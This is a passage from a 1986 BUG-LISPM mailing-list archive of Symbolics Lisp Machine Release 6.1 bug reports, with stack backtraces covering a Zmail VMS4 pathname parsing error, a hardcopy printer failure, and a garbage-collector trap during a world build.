    (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
       Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 500047>

    TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
       Arg 0 (TV:NEW-MODE): :BLAST
       Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
       Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 500054>

    SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
       Arg 0 (SI:NAME): "Lisp Top Level"
       Arg 1 (SI:ABORT-FUNCTION): NIL
       Arg 2 (SI:READ-FUNCTION): NIL
       Arg 3 (SI:EVAL-FUNCTION): NIL
       Arg 4 (SI:PRINT-FUNCTION): NIL

    SI:LISP-COMMAND-LOOP:  (P.C. = 67)
       Arg 0: #<LISP-LISTENER Lisp Listener 1 43200064 exposed>
       Rest arg: (:NAME "Lisp Top Level")

    SI:LISP-TOP-LEVEL1:  (P.C. = 5)
       Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 1 43200064 exposed>

    SI:LISP-TOP-LEVEL:  (P.C. = 7)

29-May-86 17:45:38-EDT,10202;000000000000
Received: from 17316 by OZ.AI.MIT.EDU via Chaosnet; 29 May 86 17:45-EDT
Received: from HARVEY.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 39306; Thu 29-May-86 17:43:32-EDT
Date: Thu, 29 May 86 17:43 EDT
From: PSZ@MIT-MC.ARPA
Sender: Grady@MIT-MC.ARPA
Subject: Bug in parsing mail file names from Babyl files on VMS4
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860529174328.1.GRADY@HARVEY.LCS.MIT.EDU>

There seems to be a problem in parsing the filename that appears in
Babyl files indicating where the mail is to be read from.  I was
originally setting up a situation in which Grady would receive his mail
on MC (MC:GUEST1;GRADY MAIL) but keep his babyl file on Oberon
(OBI:[GRADY]BABYL.TEXT).  When Zmail went to parse the mail file name,
it got confused thinking that it was supposed to be a VMS4 file name,
and died in thinking that there was no version number after the ;.
Below is a demonstration of the same sort of confusion when the mail
file is said to reside on Zermatt.  This means that I can't keep a Babyl
file on a VMS4 machine and have mail read from anywhere else, and
appears to be a bug rather than a feature.  --Pete Sz.

---------------- 

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.23, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.2, 6-1-Patches 1.15, MLSite 15.0,
Illustrate 6.1, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), Documentation, FGrep, on Lisp Machine William Harvey:



>>Error: ">GRADY>MAIL" is an invalid name component for OBERON (a VMS4 host).
While in the function (:METHOD FS:PATHNAME :VALIDATE-COMPONENT)  (:METHOD FS:PATHNAME :VALIDATE)  (:METHOD FS:PATHNAME-HASH-TABLE-MIXIN :GET-PATHNAME)

(:METHOD FS:PATHNAME :VALIDATE-COMPONENT):  (P.C. = 40)
   Arg 0 (SELF): #<VMS4-PATHNAME "OBERON:Z:FOO.TEXT">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:PATHNAME -- 8. IV's, 1. FL's 20563263>
   Arg 2 (SI:OPERATION): :VALIDATE-COMPONENT
   Arg 3 (FS:TEST-ARG): ">GRADY>MAIL"
   Arg 4 (FS:TEST-ARG-LOC): #<DTP-LOCATIVE 13307146>
   Arg 5 (FS:VALID-MSG): :RAW-NAME
   Arg 6 (FS:TEST-MSG): :VALID-NAME-P
   Arg 7 (FS:CASE-MSG): :CASE-NAME
   Arg 8 (FS:UNCASE-MSG): :UNCASE-NAME
   Arg 9 (FS:COMPONENT): :NAME
   Arg 10 (FS:PRETTY-NAME): "name component"

(:METHOD FS:PATHNAME :VALIDATE):  (P.C. = 45)
   Arg 0 (SELF): #<VMS4-PATHNAME "OBERON:Z:FOO.TEXT">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:PATHNAME -- 8. IV's, 1. FL's 20563263>
   Arg 2 (SI:OPERATION): :VALIDATE

(:METHOD FS:PATHNAME-HASH-TABLE-MIXIN :GET-PATHNAME):  (P.C. = 30)
   Arg 0 (SELF): #<CASE-INSENSITIVE-PATHNAME-HASH-TABLE OBERON>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:PATHNAME-HASH-TABLE-MIXIN -- 1. IV's, 0. FL's 120207144>
   Arg 2 (SI:OPERATION): :GET-PATHNAME
   Arg 3 (FS:DEV): "Z"
   Arg 4 (FS:DIR): NIL
   Arg 5 (FS:NAM): ">GRADY>MAIL"
   Arg 6 (FS:TYP): "TEXT"
   Arg 7 (FS:VRS): NIL
   Arg 8 (FS:OTHERS): NIL
   Arg 9 (FS:KEY): ("Z" NIL ">GRADY>MAIL" "TEXT" NIL)

(:METHOD NET:PATHNAME-HOST-MIXIN :GET-PATHNAME):  (P.C. = 31)
   Arg 0 (SELF): #<VMS-HOST OBERON 43311746>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NET:PATHNAME-HOST-MIXIN -- 3. IV's, 0. FL's 121113144>
   Arg 2 (SI:OPERATION): :GET-PATHNAME
   Arg 3 (NETI:DEV): "Z"
   Arg 4 (NETI:DIR): NIL
   Arg 5 (NETI:NAM): ">GRADY>MAIL"
   Arg 6 (NETI:TYP): "TEXT"
   Arg 7 (NETI:VRS): NIL
   Arg 8 (NETI:OTHERS): NIL

FS:PARSE-PATHNAME:  (P.C. = 316)
   Arg 0 (FS:THING): "z:>Grady>Mail.text"
   Arg 1 (FS:WITH-RESPECT-TO): #<VMS-HOST OBERON 43311746>
   --Defaulted args:--
   Arg 2 (FS:DEFAULTS): ((#<VMS-HOST OBERON 43311746> . #<VMS4-PATHNAME "OBERON:USRD$:[GRADY]FOO.LSP">) (#<LISPM-HOST ZERMATT 43300636> . #<LMFS-PATHNAME "Z:>Lisp-Machine>foo.lisp">) (NIL . #<VMS4-PATHNAME "OBERON:USRD$:[GRADY]FOO.LSP">))

(:METHOD FS:PATHNAME :PARSE-TRUENAME):  (P.C. = 11)
   Arg 0 (SELF): #<VMS4-PATHNAME "OBERON:DEV:[FOO]FOO.LSP">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:PATHNAME -- 8. IV's, 1. FL's 20563263>
   Arg 2 (SI:OPERATION): :PARSE-TRUENAME
   Arg 3 (STRING): "z:>Grady>Mail.text"
   Arg 4 (FS:FROM-FILESYSTEM): NIL

(:METHOD FS:PATHNAME :HEURISTIC-PARSE-MAYBE-HOSTED-PATHNAME):  (P.C. = 6)
   Arg 0 (SELF): #<VMS4-PATHNAME "OBERON:DEV:[FOO]FOO.LSP">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:PATHNAME -- 8. IV's, 1. FL's 20563263>
   Arg 2 (SI:OPERATION): :HEURISTIC-PARSE-MAYBE-HOSTED-PATHNAME
   Arg 3 (STRING): "z:>Grady>Mail.text"

FS:HEURISTIC-PARSE-MAYBE-HOSTED-PATHNAME:  (P.C. = 12)
   Arg 0 (STRING): "z:>Grady>Mail.text"
   Arg 1 (FS:DEFAULTS): ((#<VMS-HOST OBERON 43311746> . #<VMS4-PATHNAME "OBERON:USRD$:[GRADY]BABYL.TEXT">) (NIL . #<VMS4-PATHNAME "OBERON:USRD$:[GRADY]BABYL.TEXT">))

ZWEI:PATHNAME-LIST-OPTION-PARSER:  (P.C. = 27)
   Arg 0 (ZWEI:TYPE): :MAIL
   Arg 1 (STRING): "Mail: z:>Grady>Mail.text"
   Arg 2 (ZWEI:START): 6

ZWEI:OPTION-FROM-STRING:  (P.C. = 42)
   Arg 0 (STRING): "Mail: z:>Grady>Mail.text"

ZWEI:PARSE-BABYL-OPTIONS:  (P.C. = 42)
   Arg 0 (ZWEI:STREAM): #<FILE-INPUT-CHARACTER-STREAM "OBERON:USRD$:[GRADY]BABYL.TEXT" 32700023>
   Arg 1 (ZWEI:INTERVAL): #<NODE 33011602>

(:METHOD ZWEI:BABYL-BUFFER :AFTER :INIT):  (P.C. = 15)
   Arg 0 (SELF): #<BABYL-BUFFER "OBERON:USRD$:[GRADY]BABYL.TEXT" 33011556>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:BABYL-BUFFER -- 3. IV's, 6. FL's 120511737>
   Arg 2 (SI:OPERATION): :INIT
   Arg 3 (PLIST): #<DTP-LOCATIVE 36300456>

(:METHOD ZWEI:BABYL-BUFFER :COMBINED :INIT):  (P.C. = 35)
   Arg 0 (SELF): #<BABYL-BUFFER "OBERON:USRD$:[GRADY]BABYL.TEXT" 33011556>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:BABYL-BUFFER -- 3. IV's, 6. FL's 120511737>
   Arg 2 (SI:.OPERATION.): :INIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<DTP-LOCATIVE 36300456>)

INSTANTIATE-FLAVOR:  (P.C. = 445)
   Arg 0 (SI:FLAVOR-NAME): ZWEI:BABYL-BUFFER
   Arg 1 (SI:INIT-PLIST): #<DTP-LOCATIVE 36300456>
   Arg 2 (SI:SEND-INIT-MESSAGE-P): :MAYBE
   --Defaulted args:--
   Arg 3 (SI:RETURN-UNHANDLED-KEYWORDS-P): NIL
   Arg 4 (SI:AREA-TO-CONS-INSTANCE-IN): NIL

MAKE-INSTANCE:  (P.C. = 6)
   Arg 0 (SI:FLAVOR-NAME): ZWEI:BABYL-BUFFER
   Rest arg (SI:INIT-OPTIONS): (:PATHNAME #<VMS4-PATHNAME "OBERON:USRD$:[GRADY]BABYL.TEXT"> :STREAM #<FILE-INPUT-CHARACTER-STREAM "OBERON:USRD$:[GRADY]BABYL.TEXT" 32700023> :ID (#<VMS4-PATHNAME "OBERON:USRD$:[GRADY]BABYL.TEXT;4"> . 2726774799) :APPEND-P T :READ-ONLY NIL ...)

ZWEI:MAKE-SEQUENCE:  (P.C. = 6)
   Arg 0 (ZWEI:TYPE): ZWEI:BABYL-BUFFER
   Rest arg (ZWEI:OPTIONS): (:PATHNAME #<VMS4-PATHNAME "OBERON:USRD$:[GRADY]BABYL.TEXT"> :STREAM #<FILE-INPUT-CHARACTER-STREAM "OBERON:USRD$:[GRADY]BABYL.TEXT" 32700023> :ID (#<VMS4-PATHNAME "OBERON:USRD$:[GRADY]BABYL.TEXT;4"> . 2726774799) :APPEND-P T :READ-ONLY NIL ...)

ZWEI:GET-ZMAIL-FILE:  (P.C. = 250)
   Arg 0 (ZWEI:STREAM): #<FILE-INPUT-CHARACTER-STREAM "OBERON:USRD$:[GRADY]BABYL.TEXT" 32700023>
   Arg 1 (ZWEI:PATHNAME): #<VMS4-PATHNAME "OBERON:USRD$:[GRADY]BABYL.TEXT">
   Arg 2 (ZWEI:BACKGROUND-P): T
   --Defaulted args:--
   Arg 3 (ZWEI:FLAVOR): ZWEI:BABYL-BUFFER
   Arg 4 (ZWEI:READ-ONLY): NIL

ZWEI:STARTUP-MAIL-FILE:  (P.C. = 102)
   Arg 0 (ZWEI:NEW-PATHNAME): NIL

(:INTERNAL (:INTERNAL (:PROPERTY ZWEI:ZMAIL-COMMAND-LIST-DEFAULT :DEFUN-SELECT-METHOD) 0 (**)) 0):  (P.C. = 5)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 17135225 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-COMMAND-LOOP-MIXIN -- 6. IV's, 0. FL's 120412165>
   Arg 2 (FUNCTION): ZWEI:STARTUP-MAIL-FILE
   Rest arg (ARGS): (NIL)

(:INTERNAL (:PROPERTY ZWEI:ZMAIL-COMMAND-LIST-DEFAULT :DEFUN-SELECT-METHOD) 0 ((ZWEI:SUMMARY-EXECUTE :TYPEOUT-EXECUTE :EXECUTE))):  (P.C. = 7)
   Arg 0 (SI:**DEFSELECT-OP**): :EXECUTE
   Arg 1 (SELF): #<ZMAIL-FRAME Main Zmail Window 17135225 exposed>
   Arg 2 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-COMMAND-LOOP-MIXIN -- 6. IV's, 0. FL's 120412165>
   Rest arg (SI:.ARGS.): (ZWEI:STARTUP-MAIL-FILE NIL)

(:PROPERTY ZWEI:ZMAIL-COMMAND-LIST-DEFAULT :DEFUN-SELECT-METHOD):  (P.C. = 12)
   Arg 0 (SI:OPERATION): :EXECUTE
   Rest arg (SI:SELECT-METHOD-ARGS): (#<ZMAIL-FRAME Main Zmail Window 17135225 exposed> #<Map to flavor ZWEI:ZMAIL-COMMAND-LOOP-MIXIN -- 6. IV's, 0. FL's 120412165> ZWEI:STARTUP-MAIL-FILE NIL)

(:DEFUN-METHOD ZWEI:ZMAIL-COMMAND-LIST-DEFAULT):  (P.C. = 12)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 17135225 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-COMMAND-LOOP-MIXIN -- 6. IV's, 0. FL's 120412165>
   Arg 2 (SI:.OP.): :EXECUTE
   Rest arg (SI:.ARGS.): (ZWEI:STARTUP-MAIL-FILE NIL)

ZWEI:ZMAIL-COMMAND-LIST-DEFAULT:  (P.C. = 12)
   Rest arg (ARGS): (:EXECUTE ZWEI:STARTUP-MAIL-FILE NIL)

ZWEI:ZMAIL-COMMAND-LIST:  (P.C. = 107)
   Arg 0 (SI:OPERATION): :EXECUTE
   Rest arg (SI:SELECT-METHOD-ARGS): (ZWEI:STARTUP-MAIL-FILE NIL)

(:METHOD ZWEI:ZMAIL-FRAME :PROCESS-SPECIAL-COMMAND):  (P.C. = 16)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 17135225 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :PROCESS-SPECIAL-COMMAND
   Rest arg (ARGS): (:EXECUTE ZWEI:STARTUP-MAIL-FILE NIL)

(:METHOD ZWEI:ZMAIL-FRAME :COMMAND-LOOP):  (P.C. = 136)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 17135225 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :COMMAND-LOOP

(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :COMMAND-LOOP):  (P.C. = 70)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 17135225 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :COMMAND-LOOP
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMAIL-PROCESS-TOP-LEVEL:  (P.C. = 105)
   Arg 0 (ZWEI:WINDOW): #<ZMAIL-FRAME Main Zmail Window 17135225 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
29-May-86 18:31:30-EDT,4097;000000000000
Received: from 17316 by OZ.AI.MIT.EDU via Chaosnet; 29 May 86 18:31-EDT
Received: from MX.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 39322; Thu 29-May-86 18:29:40-EDT
Received: from ROCKY-GRAZIANO.LCS.MIT.EDU by MX.LCS.MIT.EDU via Chaosnet; 29 MAY 86  18:30:36 EDT
Date: Thu, 29 May 86 18:29 EDT
From: Jonathan A Rees <JAR@MIT-AI.ARPA>
Subject: :Hardcopy File ... ==> The symbol NIL has an invalid function definition ...
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <"860529182929.7.jar@AI"@ROCKY-GRAZIANO.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13,
microcode TMC5-IO4-ST506-MIC 336, on Lisp Machine Rocky Graziano:

I said

   :Hardcopy File "AI:JAR;R3RS STUFF" :Printer OVAL

and got the following, which is not what I'd call an informative error
message.  (It might have resulted from all namespace servers being
unreachable.)

- Jonathan


>>Error: The symbol NIL has an invalid function definition
While in the function NIL  (:METHOD SI:PRINTER :HARDCOPY-DEVICE-STREAM)  (:METHOD SI:HARDCOPY-DEVICE-MIXIN :MAKE-HARDCOPY-STREAM)

NIL:
   Arg 0: #<RANDOM-PRINTER OVAL 43303022>
   Arg 1: ((:SPOOL-VIA "SIMPLE-IMAGEN-PRINT"))
   Arg 2: (:BANNER-FILE-NAME "AI: JAR; R3RS STUFF" :BANNER-CREATION-DATE 2726776198)

(:METHOD SI:PRINTER :HARDCOPY-DEVICE-STREAM):  (P.C. = 25)
   Arg 0 (SELF): #<RANDOM-PRINTER OVAL 43303022>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:PRINTER -- 5. IV's, 0. FL's 120453351>
   Arg 2 (SI:OPERATION): :HARDCOPY-DEVICE-STREAM
   Arg 3 (SI:SPOOLER-OPTIONS): (:BANNER-FILE-NAME "AI: JAR; R3RS STUFF" :BANNER-CREATION-DATE 2726776198)

(:METHOD SI:HARDCOPY-DEVICE-MIXIN :MAKE-HARDCOPY-STREAM):  (P.C. = 142)<<Error printing function name>>
   Arg 0 (SELF): #<RANDOM-PRINTER OVAL 43303022>
   Arg 1 (SYS:SELF-MAPPING-TABLE): SI:HARDCOPY-DEVICE-MIXIN
   Arg 2 (SI:OPERATION): :MAKE-HARDCOPY-STREAM
   Arg 3 (SI:OPTIONS): (:NEW-PAGE-HOOK #<DTP-COMPILED-FUNCTION SI:HARDCOPY-PRINT-PAGE-HEADING 47771550> :HEADER-FONT-P T :PAGE-NUMBER 0 :BANNER-FILE-NAME "AI: JAR; R3RS STUFF" :BANNER-CREATION-DATE 2726776198 ...)

SI:MAKE-HARDCOPY-STREAM:  (P.C. = 52)
   Arg 0 (SI:DEVICE): #<RANDOM-PRINTER OVAL 43303022>
   Rest arg (SI:OPTIONS): (:NEW-PAGE-HOOK #<DTP-COMPILED-FUNCTION SI:HARDCOPY-PRINT-PAGE-HEADING 47771550> :HEADER-FONT-P T :PAGE-NUMBER 0 :BANNER-FILE-NAME "AI: JAR; R3RS STUFF" :BANNER-CREATION-DATE 2726776198 ...)

SI:HARDCOPY-FROM-STREAM:  (P.C. = 137)<<Error printing function name>>
   Arg 0 (SI:STREAM): #<FILE-INPUT-CHARACTER-STREAM "AI: JAR; R3RS STUFF" 17527277>
   Arg 1 (SI:DEVICE): #<RANDOM-PRINTER OVAL 43303022>
   Rest arg (SI:OPTIONS): (:BANNER-FILE-NAME "AI: JAR; R3RS STUFF" :BANNER-CREATION-DATE 2726776198 :PRESS-FONTS (NIL) :INTERPRET-FONT-CHANGES T :COPIES 1 ...)

SI:HARDCOPY-FILE:  (P.C. = 132)<<Error printing function name>>
   Arg 0 (SI:FILE-NAME): #<ITS-PATHNAME "AI: JAR; R3RS STUFF">
   Arg 1 (SI:DEVICE): #<RANDOM-PRINTER OVAL 43303022>
   Rest arg (SI:OPTIONS): (:FORMAT :TEXT :PRESS-FONTS (NIL) :INTERPRET-FONT-CHANGES T :COPIES 1 :PAGE-HEADINGS T ...)
   Local 2 (SI:OPTIONS): (:PRESS-FONTS (NIL) :INTERPRET-FONT-CHANGES T :COPIES 1 :PAGE-HEADINGS T :LANDSCAPE-P NIL)

SI:HARDCOPY-TEXT-FILE:  (P.C. = 11)
   Arg 0 (SI:FILE-NAME): #<ITS-PATHNAME "AI: JAR; R3RS STUFF">
   Arg 1 (SI:DEVICE): #<RANDOM-PRINTER OVAL 43303022>
   Rest arg (SI:OPTIONS): (:PRESS-FONTS (NIL) :INTERPRET-FONT-CHANGES T :COPIES 1 :PAGE-HEADINGS T :LANDSCAPE-P NIL)

PRESS:CP-BACKGROUND-HARDCOPY:  (P.C. = 151)<<Error printing function name>>
   Rest arg (ARGS): (:SOURCE ((:TEXT #<ITS-PATHNAME "AI: JAR; R3RS STUFF">)) :BANNER-MESSAGE NIL :COPIES 1 :DELETE NIL :FONTS (NIL) ...)

SI:PROCESS-RUN-FUNCTION-INTERNAL:  (P.C. = 52)
   Arg 0 (SI:RESTART-ON-RESET): NIL
   Arg 1 (FUNCTION): #<DTP-COMPILED-FUNCTION PRESS:CP-BACKGROUND-HARDCOPY 50045533>
   Rest arg (ARGS): (:SOURCE ((:TEXT #<ITS-PATHNAME "AI: JAR; R3RS STUFF">)) :BANNER-MESSAGE NIL :COPIES 1 :DELETE NIL :FONTS (NIL) ...)

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   Arg 0 (IGNORE): NIL
29-May-86 19:57:19-EDT,1673;000000000000
Received: from 17316 by OZ.AI.MIT.EDU via Chaosnet; 29 May 86 19:57-EDT
Received: from MIT-REAGAN.ARPA by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 39338; Thu 29-May-86 19:55:40-EDT
Received: from OTIS.AI.MIT.EDU by REAGAN.AI.MIT.EDU via CHAOS with CHAOS-MAIL id 33963; Thu 29-May-86 19:54:23-EDT
Date: Thu, 29 May 86 19:55 EDT
From: Chris Lindblad <CJL@REAGAN.AI.MIT.EDU>
Subject: :Hardcopy File ... ==> The symbol NIL has an invalid function definition ...
To: JAR@AI.AI.MIT.EDU
cc: BUG-LISPM@ZERMATT.LCS.MIT.EDU
In-Reply-To: <"860529182929.7.jar@AI"@ROCKY-GRAZIANO.LCS.MIT.EDU>
Message-ID: <860529195527.3.CJL@OTIS.AI.MIT.EDU>

    Date: Thu, 29 May 86 18:29 EDT
    From: Jonathan A Rees <JAR@MIT-AI.ARPA>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13,
    microcode TMC5-IO4-ST506-MIC 336, on Lisp Machine Rocky Graziano:

    I said

       :Hardcopy File "AI:JAR;R3RS STUFF" :Printer OVAL

    and got the following, which is not what I'd call an informative error
    message.  (It might have resulted from all namespace servers being
    unreachable.)

    - Jonathan


    >>Error: The symbol NIL has an invalid function definition
    While in the function NIL  (:METHOD SI:PRINTER :HARDCOPY-DEVICE-STREAM)  (:METHOD SI:HARDCOPY-DEVICE-MIXIN :MAKE-HARDCOPY-STREAM)

Imagen and QMS printers are only supported by AI and ML site lisp
machines. You can tell if the machine you are using is such if the
herald has "MIT Artificial intelligence lab..." or "MIT Mathlab..." in
the title.

You can try to use an imagen from your machine if you first load
sys:mlsite;impress-stream.bin into your machine, but no guarantees.
31-May-86 22:04:44-EDT,4801;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 31 May 86 22:04-EDT
Received: by EDDIE (5.31/4.7) id AA11841; Sat, 31 May 86 22:02:35 EDT
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA01887; Sat, 31 May 86 22:04:22 EDT
Date: Sat, 31 May 86 22:02 EDT
From: <STRAZ@ZAXXON.ARPA>
Subject: problem with GC-IMMEDIATELY, building 6.1
To: BUG-LISPM@MEDIA-LAB.MIT.EDU
Cc: straz@MEDIA-LAB.MIT.EDU
Message-Id: <"860531220229.1.STRAZ@ZAXXON"@ZAXXON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, COLOR 135.50,
COLOR-DEMO 68.7, COLOR-EXTENSIONS 4.6, TMC 3d Image Toolkit 75.4,
microcode TMC5-COLOR-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(3), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Zaxxon:

I tried to get back to basics and build a fresh world from the Rel 6.1
distribution tapes. Immediately after a Disk Restore, I tried a
GC-IMMEDIATELY and got this error.  I needed the world built in a hurry,
so I did another Disk Restore and made the current incremental world
without ever calling GC-IMMEDIATELY. The bug remains; the stack is at
the end of this file.

When building the world from a Disk Restore (of FEP0:>Release-6-1.load),
it prompts for a name to save into. When you give the same name (the
default), it says "Attempt to write over world this world was
instabooted from?". There is no indication in either the 6-1 release
notes or on-line whether this is a potentially tragic thing to do or
not. I gave it a new name, but is it OK to go ahead and overwrite the
load of the same name?

Now that I'm building worlds, I see contradictory advice in the IP/TCP documentation
(Document #998014, October, 1985). On page 21 ("3.3.2 Configuring a new IP/TCP site")
it states:
 "The steps in this section must be performed on the Symbolics Lisp
  Machine that is the primary namespace server at your site. The
  installation will fail if you perform these steps on a machine
  other than the primary namespace server...

  3. Use the Save World command to save the current world load... it is essential
  to save the world at this time"

But, on page 24 ("3.4 Installing TCP/IP for the entire site"):

  "We recommend that you do not copy the world from the primary namespace
   server...."

Well, IP/TCP is pretty basic, and I want it at the root of my incremental
world saves. Do I build it on my namespace server or not?

==============================================================================
>>Trap: The word #<DTP-GC-FORWARD 674264566> was read from location 6157230 (in ETHER-BUFFER-AREA).
While in the function SI:SCAVENGE-REGION  SI:%GC-SCAVENGE  SI:GC-RECLAIM-OLDSPACE

SI:SCAVENGE-REGION:  (P.C. = 355)
   Arg 0 (SI:REGION): 16
   Arg 1 (SI:WORK-UNITS): 1024
   Arg 2 (SI:MAX-TIME): 50000
   Local 2 (SI:MAX-TIME): 1212001681
   Local 3 (SI:ORIGIN): 1605632
   Local 4 (SI:SPACE): 4
   Local 5 (SI:ORIGINAL-GC-POINTER): 24087
   Local 6 (SI:POINTER): 1629719
   Local 7 (SI:FINAL-PASS): T
   Local 8 (SI:END-POINTER): 0
   Local 9 (SI:SKIP-OVER-STACK): NIL
   Local 10 (SI:STACK-POINTER): NIL
   Local 11 (SI:PREFETCH-MARK): 1630743
   Local 12 (SI:OTHER-PREFETCH-MARK): 0
   Local 13 (SI:STACK-BUFFER-KLUDGE): NIL
   Local 14 (SI:BASE-WORK): 215390
   Local 15 (SI:DELAY): 128
   Local 16 (SI:START-POINTER): 1629719
   Local 17 (SI:START-TIME): 1211951714
   Local 18 (SI:START-FETCHES): 6276
   Local 19 (SI:FREE): 32768
   Local 20 (SI:COUNT): 1024

SI:%GC-SCAVENGE:  (P.C. = 234)
   Arg 0 (SI:WORK-UNITS): NIL
   --Defaulted args:--
   Arg 1 (SI:MAX-TIME): NIL
   Arg 2 (CONS): NIL

SI:GC-RECLAIM-OLDSPACE:  (P.C. = 3)

GC-IMMEDIATELY:  (P.C. = 77)
   --Defaulted args:--
   Arg 0 (SI:NO-QUERY): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (GC-IMMEDIATELY)
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 500047>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 500054>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Lisp Top Level"
   Arg 1 (SI:ABORT-FUNCTION): NIL
   Arg 2 (SI:READ-FUNCTION): NIL
   Arg 3 (SI:EVAL-FUNCTION): NIL
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<LISP-LISTENER Lisp Listener 1 43200064 exposed>
   Rest arg: (:NAME "Lisp Top Level")

SI:LISP-TOP-LEVEL1:  (P.C. = 5)
   Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 1 43200064 exposed>

SI:LISP-TOP-LEVEL:  (P.C. = 7)

 1-Jun-86 03:20:08-EDT,5190;000000000000
Received: from MACH.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 Jun 86 03:20-EDT
Date: Sun, 1 Jun 86 03:20 EDT
From: David Vinayak Wallace <Gumby@AI.AI.MIT.EDU>
Subject: can't send :FINISH message to a file open on ITS
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860601032014.3.GUMBY@MACH.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 16.0, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0, Japanese 24.2,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(5),
FEP0:>v127-loaders.flod(5), FEP0:>v127-info.flod(5),
FEP0:>v127-debug.flod(10), on Lisp Machine Ernst Mach:

which seems a bit lame to me

>>Error: Unknown command
While in the function (:METHOD FS:HOST-UNIT :COMMAND)  (:METHOD FS:FILE-DATA-STREAM-MIXIN :COMMAND)  (:METHOD FS:FILE-OUTPUT-STREAM-MIXIN :FINISH)

(:METHOD FS:HOST-UNIT :COMMAND):  (P.C. = 236)
   Arg 0 (SELF): #<HOST-UNIT 27416174>
   Arg 1 (SELF-MAPPING-TABLE): FS:HOST-UNIT
   Arg 2 (SI:OPERATION): :COMMAND
   Arg 3 (FS:MARK-P): :OUTPUT
